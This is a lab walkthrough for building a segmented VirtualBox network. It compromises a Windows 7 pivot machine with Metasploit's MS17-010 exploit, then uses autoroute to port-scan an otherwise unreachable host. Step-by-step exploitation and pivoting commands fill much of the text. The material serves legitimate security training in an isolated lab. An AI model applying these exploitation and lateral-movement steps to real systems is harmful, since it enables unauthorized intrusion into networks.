# Security Tools: Use Metasploit's Port Forwarding Capabilities to Gain Access to a Machine That Doesn't Have Direct Internet Access

---

## Objectives
- Build a segmented lab network where an isolated target ("Target 2") is only reachable through a dual-homed pivot machine ("Target 1"), not directly from the attacker.
- Confirm the network segmentation actually works (attacker can reach the pivot, but not the isolated target).
- Compromise the pivot machine via MS17-010, then use Metasploit's `autoroute` to pivot through it and port-scan the otherwise-unreachable target.

---

## Tools
- **VirtualBox internal networks** — used to segment `net-A` (Kali ↔ Target 1) and `net-B` (Target 1 ↔ Target 2).
- **Metasploit Framework (`msfconsole`)** — MS17-010 exploit, `post/multi/manage/autoroute`, and `scanner/portscan/tcp`.
- **ping** — used to validate network isolation before and reachability after pivoting.

---

## Steps

### 1. Network setup — Kali (Attacker), `192.168.10.1`
- Adapter 1 → Internal Network → `net-A`
- Confirm "Cable Connected" is checked
- Assign a static IP:
  ```
  ip a
  ```
  Identify the interface name (e.g., `eth0`), then:
  ```
  sudo ip addr add 192.168.10.1/24 dev eth0
  ip a
  ```
  Confirm you see `inet 192.168.10.1/24`.

### 2. Network setup — Target 1 (Windows 7, the pivot machine)
- Adapter 1 → Internal Network → `net-A` (same as Kali)
- Adapter 2 → Internal Network → `net-B` (same as Target 2)
- Confirm "Cable Connected" on both adapters
- Via `ncpa.cpl`, assign static IPv4 addresses:
  - Adapter on `net-A`: IP `192.168.10.2`, subnet `255.255.255.0`
  - Adapter on `net-B`: IP `192.168.137.1`, subnet `255.255.255.0`

### 3. Network setup — Target 2 (Windows 7, the isolated target), `192.168.137.2`
- Adapter 1 → Internal Network → `net-B` (same as Target 1's second adapter)
- Confirm "Cable Connected" is checked
- Via `ncpa.cpl`, assign a static IPv4 address: IP `192.168.137.2`, subnet `255.255.255.0`

### 4. Validate isolation from Kali
```
ping 192.168.10.2      # should succeed (Target 1 replies)
ping 192.168.137.2     # should fail completely (isolated)
```

### 5. Exploit Target 1 (the pivot) via MS17-010
```
msfconsole
search ms17-010
use 0
show payloads
set payload 26
set RHOST <Target 1 IP address>
set GroomAllocations 10
set GroomDelta 5
run
meterpreter > getuid
```
Expected result:
```
Server username: NT AUTHORITY\SYSTEM
```

### 6. Background the session
```
background
```

### 7. Add a route to Target 2's network via autoroute
```
use post/multi/manage/autoroute
options
set SESSION 1
set SUBNET 192.168.137.0
run
```

### 8. Confirm the route was added
```
route print
```
Should show: Subnet `192.168.137.0`, Netmask `255.255.255.0`, Gateway `Session 1`.

### 9. Port-scan Target 2 through the pivot
```
use scanner/portscan/tcp
set RHOSTS 192.168.137.2
set PORTS 1-500
set THREADS 3
run
```
Confirm the open port(s) on Target 2 are reported, demonstrating access to a host with no direct route from the attacker.

---

## My Solution:

[View My Solution:](https://youtu.be/HwVXq-LCbyg)

---
